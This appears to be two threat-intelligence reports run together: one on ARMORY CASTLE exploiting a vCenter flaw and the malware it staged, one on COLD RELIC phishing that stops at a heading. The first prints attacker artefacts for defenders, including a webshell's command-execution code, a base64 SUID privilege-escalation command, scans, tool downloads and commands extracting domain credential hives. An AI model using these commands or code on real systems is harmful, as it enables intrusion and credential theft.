Written by: Jayson Frost, Bryce Greathouse, Dhanesh Kizhakkinan, John Palmisano, Steve Rasch, Daniel Sislo, John Wolfram Introduction On Oct. 15, 2026, Mandiant and Google Threat Intelligence Group (GTIG) published a blog post detailing recent activity in which the suspected PRC-nexus threat actor ARMORY CASTLE (formerly tracked as UNC5221) exploited CVE-2026-102764, a zero-day vulnerability in BeyondTrust Remote Support, which was patched in BT26-05. We also described some of the threat actor’s post-exploitation operations. In this blog we describe additional post-compromise activity involving the exploitation of a vulnerability in VMware vCenter and the deployment of additional malware families. On Nov. 19, 2026, VMware disclosed CVE-2026-123890, which impacts VMware vCenter Server deployments. vSphere consists of both ESXi (the hypervisor) and vCenter Server. The vCenter server is a centralized platform deployed as a Photon Linux virtual appliance and is used to configure, control, and monitor ESXi host environments. CVE-2026-123890 is an unauthenticated Secure Remote Password (SRP-6a) session key disclosure vulnerability over Distributed Computing Environment/Remote Procedure Calls (DCE/RPC). Successful exploitation results in a remote authentication bypass which creates an authenticated session established as administrator@vsphere.local. Using the authenticated administrator session, the attacker can execute arbitrary commands and acquire files, including the data.mdb database, by leveraging the vCenter Server Directory Service (vmdird) RPC interface vmdirdbcp. We strongly recommend that affected organizations immediately apply the security patches provided by Broadcom to remediate the vulnerability. ARMORY CASTLE exploited this vulnerability in early September 2026 using BONESAW, according to forensic evidence. BONESAW is a utility primarily built to facilitate remote exploitation written in Golang , which utilizes CVE-2026-123890 to exfiltrate the arbitrary Lightning Memory-Mapped Database (LMDB), hijack the SAML Security Token Service (STS), and create a Single Sign On (SSO) Administrator account. ARMORY CASTLE’s use of BONESAW represents significant new insight into this threat actor’s post-exploitation tactics. In this campaign, ARMORY CASTLE exploited two zero-days, and deployed three sets of malware specifically tailored for operating on targeted devices, indicating deep platform expertise and substantial resource backing. We are publishing this analysis, along with mitigation and hardening guidance, to support defenders in detecting this threat. Threat Detail Moving laterally from the Remote SupportRemote Support device, ARMORY CASTLE established a foothold on an internal Linux appliance, escalated privileges to root, and staged a suite of malware to support expanding access, persistence, and targeting of vCenter. ARMORY CASTLE exploited a zero-day vulnerability to gain access to the VMware server, and likely used an additional set of malware customized to this environment to conduct reconnaissance, credential theft, and data theft. Figure 1: ARMORY CASTLE lateral movement and vCenter compromise sequence of events Move Laterally Following the establishment of persistence and the deployment of lateral movement capabilities on the Remote Support appliance, Mandiant observed ARMORY CASTLE conducting internal reconnaissance. This reconnaissance was heavily focused on VMware systems, based on the specific ports ARMORY CASTLE scanned and the URIs the group visited such as /sdk and /ui. The group leveraged nmap to scan the internal environment for systems running open ports specific to VMware, namely ports 9080, 5480, and 2012. Notably, port 2012 is used as the control interface RPC for vCenter Single Sign-On (SSO) and is an integral part of ARMORY CASTLE’s remote exploitation of CVE-2026-123890 through BONESAW. /usr/sbin/nmap -sS -p 443,2012,389 --open .0/24 /usr/sbin/nmap -sS -p 443,2012,5480 --open .0/24 /usr/sbin/nmap -sS -p 443,9080 --open .0/24 /usr/sbin/nmap -sS -p 9080,2012 --open .0/24 /usr/sbin/nmap -sS -p 443,2012,389,445,3389,22,21 --open .0/24 Figure 2: ARMORY CASTLE nmap port scanning ARMORY CASTLE moved laterally to internal Linux appliances within the environment that lacked endpoint detection and response (EDR) tooling. ARMORY CASTLE deployed five newly identified malware families and utilities: the SLIMSAVAGE and CAGEMATCH webshells, the BEARBONES backdoor, the BONESAW remote exploitation utility, and the SAWSNAKE SAML utility. ARMORY CASTLE also deployed the LAZYBONES backdoor, which Mandiant and GTIG previously observed in a separate ARMORY CASTLE intrusion. Establish a Foothold To establish a foothold on the first Linux appliance, the actor dropped a webshell ActiveSer.jsp, tracked by Mandiant as SLIMSAVAGE. SLIMSAVAGE functions as an upgraded command execution webshell that utilizes the authentication secret pwd=123. if("123".equals(request.getParameter("pwd"))){ try{ ProcessBuilder pb = new ProcessBuilder("/bin/sh","-c",request.getParameter("i")); Process p = pb.start(); InputStream a = p.getInputStream(), b = p.getErrorStream(); int c; byte[] d = new byte[2048]; out.print("

"); out.print("\nEXIT:"+p.waitFor()); }catch(Exception e){out.print("ERR:"+e);} } Figure 3: SLIMSAVAGE Webshell By leveraging ProcessBuilder("/bin/sh", "-c", ...), the SLIMSAVAGE webshell executed commands inside a command line interpreter, enabled shell pipelines, redirects, creation of environment variables, and chained execution. The webshell reads from both standard output (getInputStream()) and standard error (getErrorStream()), ensuring full diagnostic visibility. It also calls Process.waitFor() and appends the final process return code (\nEXIT:). Roughly 4 hours later, ARMORY CASTLE deployed an additional webshell to the Linux appliance, u.jsp, tracked as CAGEMATCH. While SLIMSAVAGE provided the group with a robust capability to execute commands on the appliance, the group was limited in their ability to transfer data. To solve this challenge, CAGEMATCH acts as a dedicated payload staging webshell. The webshell checks for a multipart/form-data request header, parses the boundary delimiter, and extracts raw file bytes along with the original filename. File f = new File("/tmp"); f.mkdirs(); File fout = new File(f, fname); try(FileOutputStream fos = new FileOutputStream(fout)){ fos.write(fd); } m = fout.getAbsolutePath(); Figure 4: CAGEMATCH File Staging Logic CAGEMATCH creates the /tmp directory if necessary, saves the uploaded payload directly to /tmp/, and echoes the absolute target path back to the client. When accessed without an upload payload, it returns a minimal HTML upload form. This provides the attacker with a streamlined post-exploitation workflow: using CAGEMATCH to upload binary payloads, scripts, or tools from the Remote Support appliance directly into /tmp, and subsequently invoke SLIMSAVAGE to adjust execution permissions and execute the staged tools. Escalate Privileges To escalate privileges to root on the Linux appliance, ARMORY CASTLE repeated the same escalation technique used on the Remote Support appliance through the enablement of Set User ID (SUID) permissions on the binary /bin/env. ARMORY CASTLE performed this permission modification using the GNU Debugger, gdb. By enabling SUID permissions on the binary /bin/env, any user would be allowed to execute commands as root. /bin/sh -c echo IWNobW9kIHUrcyAvYmluL2VudgpxCg==|base64 -d > /tmp/gdb_file /usr/bin/gdb -pid 113757 --command=/tmp/gdb_file Figure 5: ARMORY CASTLE gdb Privilege Escalation Move Laterally After successfully escalating privileges to root, ARMORY CASTLE began staging additional tooling on the Linux appliance to enable lateral movement within the environment. ARMORY CASTLE used curl to download the RAR utility from the Remote Support appliance. curl -o /tmp/rar -k https:///content/r.js Figure 6: ARMORY CASTLE downloads staged RAR utility ARMORY CASTLE then utilized curl to download a rar archive 123.rar which was subsequently extracted using their downloaded RAR binary. curl -o /tmp/123.rar -k https:///content/r.js ./rar x -p 123.rar Figure 7: ARMORY CASTLE extracts BONESAW Tracked as BONESAW, /tmp/123 is a remote exploitation utility written in Golang that leverages CVE-2026-123890 in vCenter to enable remote arbitrary LMDB exfiltration, SAML STS hijacking, and SSO administrator account creation. Mandiant observed ARMORY CASTLE leveraging this utility to target an internal vCenter server, successfully creating an SSO admin account, exfiltrating and parsing the LMDB which enabled lateral movement to the server. BONESAW achieves full system compromise against vCenter Server 7.x and 8.x appliances through the exploitation of CVE-2026-123890. This vulnerability exploits a cryptographic logic and authorization flaw in VMware's rpc_srp_verifier service over port 2012, exposing a shared session key that can be used to create authenticated sessions as administrator@vsphere.local. BONESAW also provides the ability to stream the raw underlying LMDB file for offline parsing, extract the VMware Security Token Service (STS) SAML private RSA signing key, create a backdoor machine account via vmdir, forge administrative SAML 2.0 assertion tokens, and assign Global Administrator privileges on the vCenter root folder via the vSphere SOAP API. While CVE-2026-123890 shares some overlap with CVE-2026-59309, primarily the obtaining of the shared session key "K" without knowing the password, there are multiple key differences between them. CVE-2026-59309 is a flaw in the vCenter Server vmdir daemon that allows a remote, unauthenticated attacker with network access to TCP ports 389 or 636 to send crafted LDAP packets with malformed authorization tokens, bypassing authentication to forge administrative sessions and create rogue Single Sign-On (SSO) accounts in the vSphere directory. Whereas CVE-2026-123890 is a flaw in the vmdir DCE/RPC interface that enables unauthenticated Secure Remote Password session key disclosure by exploiting predictable UUIDv1 timestamp generation in the SRP authentication interface, enabling the compromise of the SRP session key without knowing any passwords. Mandiant has evidence that ARMORY CASTLE had knowledge of CVE-2026-123890 prior to the disclosure of CVE-2026-59309 on July 29, 2026. Logs indicate that BONESAW was executed in early September 2026 against a vCenter server already patched against CVE-2026-59309, and the recovered Go binary contains a build timestamp of 2026-07-13T09:21:24Z (16 days before CVE-2026-59309 was disclosed), although Go build metadata can be modified prior to compilation. ARMORY CASTLE named BONESAW vcenter-db-teamcheck-go and compiled it in a Windows development environment based on Golang build artifacts: E:/CodeFiles/VulnScan/Vcenter/go_teamcheck/. BONESAW supports multiple command-line arguments, with primary functionality centered on the csa subcommand to remotely create an SSO admin account. Subcommand csa ("Create SSO admin with minimal parameters"): • Loads embedded default configuration template and parses CLI flags: • -h: Target vCenter address or vim25 SOAP endpoint (required). • -u: Username for the new SSO admin account (required). • -p: Password for the new SSO admin account (required). • -lu: Existing vCenter local admin UPN used for the vmdird bridge authentication (default: administrator@vsphere[.]local). • -d: Tenant/domain name for the created SSO account (default: vsphere[.]local). • -mdb-path: Path to an existing data.mdb file to skip remote database download. • -check-version: Probe target version and connectivity before executing the exploit chain. • -auto-d: Auto-discover SSO tenant/domain before running (overrides -d if discovery succeeds). Figure 8: BONESAW Command Line Arguments When executed utilizing the CSA command line flag, BONESAW creates the following files on disk: /temp/extracted_tenant_signer_/anon__data.mdb (Exfiltrated copy of /storage/db/vmware-vmdir/data.mdb) /temp/extracted_tenant_signer_/-tenantcredential-.key.pem (Extracted RSA private key in PEM format) /temp/extracted_tenant_signer_/-tenantcredential-.key.der (Extracted RSA private key in DER format) /temp/extracted_tenant_signer_/-tenantcredential-.leaf.pem (Extracted leaf X.509 signing certificate) /temp/extracted_tenant_signer_/-tenantcredential-.chain.pem (Extracted X.509 certificate chain) /temp/extracted_tenant_signer_/-tenantcredential-.context.json (Target SSO and signer metadata) Figure 9: BONESAW Filesystem Artifacts Shortly after the successful execution of BONESAW, ARMORY CASTLE staged and deployed an additional utility /tmp/sss tracked as SAWSNAKE to the Linux appliance. SAWSNAKE is a Golang utility that enables vCenter SAML authentication bypass and session cookie generation, ultimately enabling ARMORY CASTLE to conduct Golden SAML attacks against vCenter following the successful execution of BONESAW. This allows the threat actor to forge authentication tokens, bypass MFA, and impersonate any user. The core functionality of SAWSNAKE is a custom Go-based port of the Python-based vCenter SAML Login Tool from vcenter_saml_login.py. SAWSNAKE provides the ability to extract Identity Provider (IdP) signing keys and trusted certificates from a vCenter data.mdb database, export extracted credentials to PEM files on disk, forge and sign SAML 2.0 assertions for the Administrator account, and authenticate to a target vCenter server to obtain administrative session cookies. SAWSNAKE parses command-line arguments to determine its operating mode and supports the following command line arguments: -h, --help - show this help message and exit -p, --path PATH - Path to the data.mdb file (extract mode) -t, --target TARGET - The IP address of the target vCenter -k, --key KEY - IdP private key PEM file (direct-cert mode) -c, --cert CERTS - Trusted certificate PEM file. May be repeated; each file may contain one or more CERTIFICATE blocks. --domain DOMAIN - SSO domain (default: parse from certificate subject DC=) --hostname HOSTNAME - vCenter FQDN (default: read from vCenter SSL certificate) -e, --export-dir EXPORT_DIR - Parse data.mdb with --path and write the PEM files needed for the direct-cert mode to this directory, then exit. -v, --verbose - Print extracted/loaded certificates Figure 10: SAWSNAKE Command Line Arguments SAWSNAKE creates the following files on disk: /idp_key.pem /trusted_cert_2.pem /domain.txt Figure 11: Files created by SAWSNAKE Mandiant identified a second sample of SAWSNAKE that is likely an updated version. This sample added verbose debug logging to standard output across TLS, HTTP, SAML initiation, XML signing, and login routines, along with expanded redirect handling for up to 10 HTTP 302 redirects to support multi-hop authentication. Consistent with earlier activity, ARMORY CASTLE deleted SAWSNAKE and its output files from disk using rm. Shortly after the deployment of SAWSNAKE, ARMORY CASTLE leveraged an additional backdoor /tmp/dbr tracked as BEARBONES. BEARBONES is written in C and is based on the open-source Dropbear SSH Server. It is capable of bypassing system password authentication when using password-based authentication, logging plaintext credentials, and loading or generating server host keys from /tmp instead of the default directory /etc/dropbear. The authentication handler svr_auth_password for the packet type SSH_MSG_USERAUTH_REQUEST was backdoored to bypass /etc/shadow validation and grant access if the SHA-256 digest of the first 14 bytes of client password matches a hardcoded SHA-256 hash, while also logging plaintext credentials. Additionally, the internal version string and the session identification string were modified to “23345” and “SSH-2.0-pulsesecure_23345”. Pivoting on this SSH banner identified a suspected obfuscation network of compromised third-party firewalls and routers exposing SSH-2.0-pulsesecure_23345 on non-standard high TCP ports. ARMORY CASTLE executed BEARBONES several times from the Linux appliance, first attempting to open a listener on TCP port 53 and later on TCP port 33992. /tmp/dbr -R -p 53 /tmp/dbr -R -p 33992 Figure 12: BEARBONES Command Line Execution After the execution of BEARBONES to create a listener on TCP port 33992, ARMORY CASTLE moved laterally to the vCenter appliance as the Administrator and created a local administrator account named sps-@vsphere.local. Notably, ARMORY CASTLE enabled SSH on vCenter via the vCenter Server Appliance Management Interface (VAMI) API through a PUT request to /rest/appliance/access/ssh. Mandiant also observed this TTP during BRICKSTORM intrusions conducted by suspected PRC-nexus actor UNC6201. After enabling SSH, ARMORY CASTLE connected to the vCenter via SSH using the newly created local administrator account. ARMORY CASTLE then conducted credential theft, targeting the vCenter internal master crypto key file as well as the PostgreSQL password file using SSH. ARMORY CASTLE disabled the SSH service via the VAMI API immediately after extracting the vCenter master symmetric key and PostgreSQL database credentials. ARMORY CASTLE then was observed authenticating to ESXi Host Client (“ESXUI”) using the vpxuser account and also connected to it via SSH using the root account. Complete Mission ARMORY CASTLE used the WinSCP client to enumerate the ESXi file system, attached disks, mounted Virtual Machine File System (VMFS) volumes, and added an SSH public key to the root account’s authorized keys. ARMORY CASTLE conducted further reconnaissance and data theft on the ESXi filesystem using the root account. The actor was primarily observed enumerating directories and VMFS volumes. To stage and exfiltrate data from the ESXi filesystem, ARMORY CASTLE created a hidden directory, .a, on a VMFS volume to which they established an SCP connection to the ESXi using scp -r -d -t "/vmfs/volumes//.a". ARMORY CASTLE then staged and extracted a suspected VMware specific toolset onto the ESXi host using tar xzf vmfs-pydist.tar.gz. python vmfs_browser.py -d "/dev/disks/vml.:1" ls . python vmfs_browser.py -d "/dev/disks/vml.:1" info "-flat.vmdk" python vmfs_browser.py -d "/dev/disks/vml.:1" ls "-flat.vmdk:part2" python vmfs_browser.py -d "/dev/disks/vml.:1" extract "-flat.vmdk:part4/Windows/NTDS" ./NTDS python vmfs_browser.py -d "/dev/disks/vml.:1" extract "-flat.vmdk:part4/Windows/System32/config/SYSTEM" ./SYSTEM python vmfs_browser.py -d "/dev/disks/vml.:1" extract "-flat.vmdk:part4/Windows/System32/config/SECURITY" ./ python vmfs_browser.py -d "/dev/disks/vml.:1" extract "-flat.vmdk:part4/Windows/System32/dns" ./ Figure 13: ARMORY CASTLE reconnaissance of guest VMs ARMORY CASTLE then archived the extracted files into o.tar.gz, copied the archive from the ESXi filesystem using scp -r -p -d -f "o.tar.gz", and deleted the hidden .a directory. On the Linux appliance, ARMORY CASTLE staged the corresponding OpenSSH RSA private key at /tmp/123.key (matching the public key added to ESXi root authorized_keys) to authenticate outbound from the Linux appliance to ESXi over SSH without a password, alongside the BEARBONES SSH listener on the Linux appliance. From the Linux appliance, staged archives were downloaded via HTTP GET requests to the Remote Support appliance, from which ARMORY CASTLE likely exfiltrated the data. /usr/bin/ssh -x -oPermitLocalCommand=no -oClearAllForwardings=yes -oRemoteCommand=none -oRequestTTY=no -i /tmp/123.key -o BatchM [TRUNCATED@128] Figure 14: ARMORY CASTLE SSH Tunnel ARMORY CASTLE deployed a Slack-based backdoor tracked as LAZYBONES (/usr/bin/vmtoolscs) to an additional Linux appliance alongside the /tmp/123.key SSH private key. ARMORY CASTLE established persistence using a systemd service file set to restart every 50 minutes. LAZYBONES is a lightweight backdoor, written in Go, that establishes command-and-control (C2) communication over HTTPS using Slack. This malware periodically checks the most recent message in a designated Slack channel for commands. LAZYBONES supports core backdoor functionalities, including command execution and file transfer. Specifically, this variant encrypts Slack C2 messages with AES-256-CTR prior to Base64 encoding, polls with a 150 to 450 second jitter interval, and supports four commands (cmd, upload, download, and sleep) for command execution, file transfer, and beacon interval adjustment. Mandiant observed ARMORY CASTLE deploying LAZYBONES in a separate campaign in early 2025 following the successful exploitation of CVE-2025-22457. Attribution GTIG attributes this activity to the suspected PRC-nexus espionage actor ARMORY CASTLE (formerly tracked as UNC5221). As noted in our prior blog, the tooling and TTPs leveraged within this campaign align with previously observed activity from ARMORY CASTLE, and in the case of LAZYBONES, directly overlap with previously observed activity. Outlook and Implications While GTIG and Mandiant have tracked ARMORY CASTLE exploiting zero-days and n-days in edge and security appliances for initial access since 2023, BONESAW represents a significant expansion into post-compromise use of zero-days. The group's use of VMware-specific tools like SAWSNAKE and vmfs_browser.py, alongside malware designed to operate on Remote Support and Linux systems, represent a diverse toolset including capabilities specifically tailored to target several different appliances, demonstrating the threat actor's deep understanding of each. The use of three separate specialized sets of malware and two zero-days in the course of a single compromise indicates that there are significant resources supporting ARMORY CASTLE operations. It also shows the extent of the threat actor’s operational commitment to compromise high priority targets. Lastly, it is important to highlight that the build time of BONESAW predates its deployment in this intrusion by over a month, indicating it was likely developed for broader operations. Remediation and Hardening The exploitation of CVE-2026-123890 by ARMORY CASTLE underscores a reality: virtualization infrastructure such as VMware vCenter remains a prime target for advanced persistent threats (APTs). Because vCenter serves as the centralized control plane for the virtualized data center, relying solely on reactive patching is insufficient to protect it. Organizations must adopt a proactive, Zero Trust approach to infrastructure hardening to defend against current and undiscovered zero-day vulnerabilities. For a comprehensive framework on securing virtualization platforms against advanced persistent threats, organizations are highly advised to consult the Mandiant guide vSphere and BRICKSTORM Malware: A Defender's Guide. This guide details an infrastructure-centric defense strategy, encompassing STIG benchmarking, identity management via Privileged Access Workstations (PAWs), and transforming the vCenter appliance into a proactive security sensor. To secure vulnerable systems, it is highly recommended that affected organizations promptly deploy the official Broadcom patch. The Risks of Default Configurations: The VCSA Host-Based Firewall A common misconception in defending the vCenter control plane is that the native VCSA host-based firewall managed via the Virtual Appliance Management Interface (VAMI) provides adequate protection against lateral movement. In practice, relying on this default GUI-based firewall introduces severe operational and security limitations that threat actors like ARMORY CASTLE exploit: Lack of Port-Specific Granularity: The native VAMI GUI lacks the precision required for a Zero Trust model. To grant an internal server (such as a backup server) legitimate access to the vSphere API on TCP 443, an administrator is often forced to trust that IP for all ports. If that internal server is compromised, the attacker inherits an unobstructed path to highly sensitive management interfaces like SSH (22) and the VAMI (5480). Circular Administrative Dependency: The VCSA firewall is managed via the VAMI, which resides on TCP port 5480. If an attacker gains VAMI access as ARMORY CASTLE demonstrated to enable SSH, they can use their compromised role to deactivate the firewall entirely. Forensic Visibility Gaps: The VAMI firewall is designed for connectivity management, not security monitoring, and does not generate remote logs for denied connection attempts or shell activity. This blinds the SOC to active lateral movement and port scanning. Inbound-Only Policy: The default GUI focuses exclusively on inbound traffic, leaving outbound (egress) policy unmanaged. This allows malware on a compromised VCSA to communicate freely with external command-and-control (C2) infrastructure. Proactive Hardening with the VCSA Hardening Tool To secure the vCenter control plane against advanced campaigns and future zero-days, Mandiant recommends utilizing the VCSA Hardening & Logging Tool. This script bypasses the vulnerable VAMI GUI and enforces security configurations directly at the Photon Linux kernel level via iptables. By transitioning the appliance to a strict "Default Deny" posture, enforcing granular egress filtering, and bridging kernel-level events to a remote SIEM, the tool transforms the VCSA from a passive appliance into an active security sensor. The table below illustrates how deploying this proactive hardening script would have disrupted ARMORY CASTLE's attack chain at multiple stages, demonstrating its efficacy against zero-day exploits. VCSA Hardening Feature Impact on the ARMORY CASTLE Attack Chain Protection Against Future Zero-Days VCSA iptables Inbound DROP Policy & Connection Logging (Management Ports) The nmap scans targeting TCP ports 443, 5480, and 22 are silently dropped because the attacker's source IP is not in the trusted whitelists. These blocked connection attempts are instantly forwarded to the SIEM via the iptables-log-bridge.sh service, exposing the active network reconnaissance. Conceals critical management interfaces from internal network mapping tools and provides high-fidelity, early-warning alerts of active lateral movement before exploitation can occur. VCSA iptables Inbound DROP Policy (TCP 443) Even if BONESAW extracts the SAML key over port 2012, the attacker cannot utilize the SAWSNAKE-forged administrative cookies. The firewall drops all connections to the vSphere Web Client/API (TCP 443) from the compromised Linux appliance because it is not in the TRUSTED_WEB_IPS array. Provides defense-in-depth: Even if a zero-day allows credential theft or authentication bypass on a backend service, the stolen credentials/tokens cannot be used to access the management plane from an untrusted network. VCSA iptables Inbound DROP Policy (TCP 2010) An iptables DROP policy on TCP 2012 for non-allowlisted IPs prevents the exploit payload originating from a compromised Linux appliance from reaching the vmdird service. Drops unauthorized inbound connections to management interfaces and RPC services, mitigating network-level exploitation of vulnerable services. VCSA iptables Inbound DROP Policy (TCP 22 & 5480) Blocks the OS-level pivot. The firewall drops the PUT request to the VAMI API (TCP 5480 or 443) used to enable the SSH daemon. Furthermore, even if SSH was already enabled, the VCSA_SSH_RULES chain drops all SSH connections Protects the underlying OS and databases from direct credential theft or tampering. Even if an attacker gains administrative privileges within the web application, they are blocked from dropping down to a root shell. VCSA iptables Egress DROP Policy An egress DROP policy prevents SCP data exfiltration and blocks the LAZYBONES backdoor from establishing HTTPS C2 communications with external Slack endpoints. Blocks unauthorized outbound internet and internal network connections, preventing the VCSA from acting as a pivot point or establishing external C2. VCSA OS-Level Command and Syslog Auditing Remote syslog forwarding captures the execution of tar and Python vmfs_browser.py over SSH, exposing the extraction of NTDS.dit and registry hives in real-time. Forwards bash command execution and dropped network packets to a SIEM, bypassing local anti-forensics (e.g., .bash_history deletion) and alerting on unauthorized shell activity. VCSA Kernel-Level Rule Enforcement iptables rules operate independently of the VAMI application, preventing the actor from using the VAMI API (/rest/appliance/access/ssh) to circumvent network security controls. Decouples network security from the vCenter application layer, ensuring firewall policies cannot be modified via compromised VAMI or vSphere administrative credentials. Written by: Josh Murchie, John Wolfram, Joseph Spero, Peter Ukhanov, Fernando Tomlinson, Jr., Wesley Shields

Introduction

Over the past year, Mandiant has responded to a series of linked intrusions demonstrating how Russian cyber espionage group COLD RELIC (formerly tracked as COLDRIVER and UNC4057; also known as Star Blizzard, Callisto, and Gossamer Bear) turns a single cloud compromise into a springboard for ongoing third party compromise and espionage. Most recently, Mandiant investigated a 2026 compromise at a US-based organization where COLD RELIC directly weaponized data, the corporate staff directory, and identities stolen during a late-2025 compromise, which Mandiant also investigated, at a separate US-based organization.

COLD RELIC is a Russian state-sponsored threat group that the US Department of Justice (DOJ) has assessed operates within Russia's Federal Security Service (FSB). The group is known for implementing sophisticated phishing and malware campaigns with the aim to gain access to information of strategic or political relevance to the Russian government, as well as to leverage compromised access to target compromised individuals’ broader social and professional networks. Once COLD RELIC compromises a target, it uses stolen emails and data to establish authentic pretexts and impersonate contacts when reaching out to subsequent targets. While COLD RELIC has largely maintained a low profile, yielding minimal public reporting relative to other Russia-nexus threat actors, it has been highly successful at compromising high-value targets (including government officials, defense contractors, and non-governmental organizations (NGOs) across Europe and North America) while maintaining a consistent operational tempo.

While Google Threat Intelligence Group (GTIG) has tracked and disrupted COLD RELIC phishing campaigns since 2015, recent Mandiant incident response investigations have uncovered critical new insights into the group’s social engineering and post-compromise tradecraft. We are sharing this end-to-end analysis—along with actionable detection and hardening guidance—to help organizations defend against COLD RELIC’s ongoing use of stolen pretexts, localized residential proxies, and cross-cloud identity abuse. As part of our efforts to thwart this threat actor, we issue Government-backed attack alerts when we detect COLD RELIC targeting Google accounts. COLD RELIC remains an active threat; GTIG has observed evidence of new phishing operations as recently as November 2026.

Threat Detail

Over more than a decade of tracking COLD RELIC alongside Mandiant incident response investigations, we have observed the group continually refine how it leverages data harvested from one intrusion to enable follow-on operations against downstream targets. In late 2025, COLD RELIC downloaded a large volume of data from a US-based organization, searching for names, email addresses, and email archives, likely to fulfill broader intelligence requirements. In 2026, Mandiant investigated a subsequent COLD RELIC intrusion at a second US-based organization where phishing URL parameters and impersonation pretexts indicated that COLD RELIC likely leveraged contact and relationship context from the first organization to target the second.

One of the hallmarks of COLD RELIC phishing campaigns is the use of a compromised website as the initial link that will redirect the target to the actual phishing domain. This provides COLD RELIC with a layer of misdirection and hides their phishing domains, while also giving them a chance to fingerprint anyone visiting the link to determine if they should be redirected or not. A COLD RELIC phishing link usually contains a parameter on the end of it with a value that is set by the attacker and often indicates a relationship to a previous victim or what the lure is. For example, a URL might look like these (though this is not always the case):

https://compromised.example.com/some_path/some_file.php?file=<previous_victim_name> https://compromised.example.com/some_path/some_file.php?ref=<lure_name>

Figure 1: Sample URLs incorporating targeted individuals’ names or lure topics

During Mandiant’s incident response investigation at the second US-based organization, responders identified that COLD RELIC initiated contact over an encrypted messaging app while impersonating an employee from the first victim organization. In parallel, GTIG correlated a COLD RELIC redirector URL from the intrusion that had been submitted to VirusTotal in June 2026, whose query parameter referenced the first victim organization.

Case Study 1 - Stolen Credentials to Data Exfiltration

During the late-2025 intrusion, GTIG observed COLD RELIC operators compromise the cloud productivity environment of a US-based organization. To gain initial access, COLD RELIC leveraged a residential proxy network in the US located in close geographical proximity to the victim. COLD RELIC authenticated using the stolen credentials of a Super Admin account, in combination with a multi-factor authentication (MFA) push notification fatigue attack. After the victim user accepted an MFA request, COLD RELIC registered a device model previously unseen within the tenant of the victim organization. COLD RELIC leveraged passkeys, MFA backup codes, and rogue MFA devices to retain access throughout the intrusion.

COLD RELIC used the privileges of the compromised Super Admin account to download the contents of the entire organization’s cloud storage drive by both mass sharing files to a COLD RELIC-operated email account and downloading files directly. While operating inside the tenant of the victim organization, COLD RELIC accessed the Admin Console, queried Admin security investigation and email audit logs to check defensive visibility, and viewed, modified, and deleted Alert Center notifications to remove forensic evidence of the initial intrusion. COLD RELIC also exported full employee lists and initiated a domain-wide data export via Google Workspace Customer Takeout using Super Admin privileges. Unlike individual end-user Google Takeout, Customer Takeout is an administrative tenant-wide export tool; these requests are logged in Google Workspace Admin audit logs (CUSTOMER_TAKEOUT_CREATED), and administrators can also disable Google Takeout for users at the organizational level.

Following mass data theft and antiforensics activities, COLD RELIC maintained access to the victim organization for several months and performed additional activities including:

Email inbox sync via OAuth to external email clients

Reauthentication using unrevoked attacker-enrolled passkeys that persisted across password and session resets and bypassed device registration controls

Targeted cloud drive document access related to credentials, email archives, personnel information, and other documents relevant to COLD RELIC’s intelligence collection requirements

When the threat actor was removed from the victim organization’s infrastructure, GTIG observed COLD RELIC leveraging email accounts impersonating employees of the victim organization. These impersonated accounts were used to target both internal employees and associates within the same professional circles with renewed social engineering attempts.

Case Study 2 - Leveraging Previous Compromise - Initial Approach

During the second intrusion, COLD RELIC demonstrated competency in navigating multi-cloud environments and federated authentication mechanisms. GTIG observed COLD RELIC operators compromise a Microsoft Entra ID user account of a US-based organization that used Entra ID as its federated single sign-on (SSO) identity provider for Google Workspace. To gain initial access, COLD RELIC impersonated an employee of the organization impacted in Case Study 1 to establish a pretext for communications over a secure messaging app. The threat actor ultimately shared phishing links during the course of the conversation. These phishing links, designed to steal credentials and authentication tokens for Entra ID, redirected the victim to document lures relevant to the ongoing conversation in order to avoid raising suspicion. Upon successful authentication using the stolen credentials, COLD RELIC registered and used a new MFA device in the SSO solution to retain access to the user account throughout the intrusion.

By impersonating someone known in the same professional circles as the new target, COLD RELIC increased their chance of phishing success. Ultimately, in this case, COLD RELIC was able to obtain credentials to the organization and perform bulk download of files accessible in the compromised user’s cloud drive.

Post-Compromise Activity

After gaining initial access to an organization, COLD RELIC registers rogue MFA devices, passkeys, and MFA backup codes to establish long-term persistence. Once persistence is secured, COLD RELIC conducts aggressive data collection and exfiltration operations, accessing email, chat, and cloud storage repositories. While COLD RELIC's primary objective post-compromise is mass collection and download of files and email archives, it simultaneously performs targeted queries for specific terms of interest. In particular, COLD RELIC searches for credentials, personnel information, email archives (.pst files), and documents related to their collection requirements. Additionally, COLD RELIC seeks out data that can support subsequent spear-phishing operations, including organizational rosters, contact lists, resumes, and event schedules to build convincing pretexts for future targets.

Beyond seeking out data to support subsequent operations, COLD RELIC also appeared to repurpose the account used in Case Study 2 for follow on targeting. After the compromise, the encrypted messaging application used for the initial approach recorded that the threat actor changed their profile name to a completely new person. GTIG believes this new persona was likely used to continue to target other organizations in the same professional circles in a similar manner to both of the cases documented here.

Outlook and Implications

COLD RELIC’s campaigns demonstrate the convergence of human-centric social engineering and cloud identity abuse. By obtaining access to strategic personnel rosters and operational documents, Russian intelligence services turn legitimate business communications into attack vectors against trusted partners. Their ability to navigate across multiple cloud ecosystems highlights that organizations must defend their entire identity estate holistically. GTIG will continue to track, disrupt, and expose COLD RELIC infrastructure to protect global cloud users.

Remediation and Hardening

As previously mentioned, GTIG has observed COLD RELIC heavily rely on residential proxy networks in the course of their intrusions. Moreover, the group goes one step further in obfuscating their activities by selecting proxies that geolocate to the same approximate location as their victim users, thereby avoiding impossible travel or other heuristic-based alerting mechanisms. GTIG recommends enriching authentication logs with residential proxy and VPN IP reputation feeds, alerting on sudden residential ASN shifts for privileged accounts, and applying conditional access policies to block or detect logons from known proxy networks.

In some cases, the severity and scope of COLD RELIC intrusions were amplified due to users storing credentials and other secrets within their organization’s cloud storage platforms. This enabled COLD RELIC to pivot to additional accounts or services that it would not have otherwise been able to access, including users’ personal accounts which are typically unmonitored by their employers. Organizations can implement cloud storage Data Loss Prevention (DLP) policies, such as Google Workspace’s Security & Data Protection, to warn or block users attempting to create, upload, or externally share files matching sensitive patterns.

In at least one case, GTIG observed that a victim organization identified the intrusion and attempted to remediate COLD RELIC’s access to their cloud tenant via password resets for impacted accounts. However, because the threat actor hijacked sessions and the victim organization failed to also revoke all existing sessions for the accounts in question, COLD RELIC maintained access. In similar circumstances, such as Business Email Compromise (BEC) intrusions, GTIG recommends organizations revoke all user sessions in addition to forcing password resets for impacted accounts.Organizations should implement the following recommendations:

Identity & Multi-Factor Authentication

